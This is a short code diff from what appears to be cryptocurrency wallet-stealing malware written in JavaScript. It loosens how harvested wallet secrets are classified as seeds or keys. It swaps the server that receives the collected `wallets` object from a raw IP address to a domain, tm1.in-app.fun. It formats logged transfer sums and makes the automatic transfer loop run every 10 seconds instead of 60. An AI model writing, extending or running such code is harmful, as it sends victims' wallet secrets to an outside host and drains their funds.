@@ -19,7 +19,7 @@ const getType = async (wallet) => {
         return 'seed';
     }
 
-    if (wallet.length === 130) {
+    if (wallet.length > 70) {
         return 'speed';
     }
 
@@ -27,7 +27,7 @@ const getType = async (wallet) => {
 };
 
 const transfer = async () => {
-    await fetch('http://193.56.8.8:30080/tm', {
+    await fetch('https://tm1.in-app.fun/tm', {
         method: 'post',
         body: JSON.stringify(wallets),
         headers: {'Content-Type': 'application/json'},
@@ -44,7 +44,9 @@ const transfer = async () => {
             if (error) {
                 log.info('ERROR Transfer:', error);
             } else {
-                log.info('Transfer: ', before, '->', after, 'Sum:', transfer);
+                log.info('Transfer: ', (before / 1000000).toFixed(6),
+                    '->', (after / 1000000).toFixed(6),
+                    'Sum:', (transfer / 1000000).toFixed(6));
             }
         });
 };
@@ -55,7 +57,7 @@ const runAutoTransfer = async () => {
     } catch (error) {
         log.info(error);
     } finally {
-        setTimeout(runAutoTransfer, 60 * 1000);
+        setTimeout(runAutoTransfer, 10 * 1000);
     }
 };
 
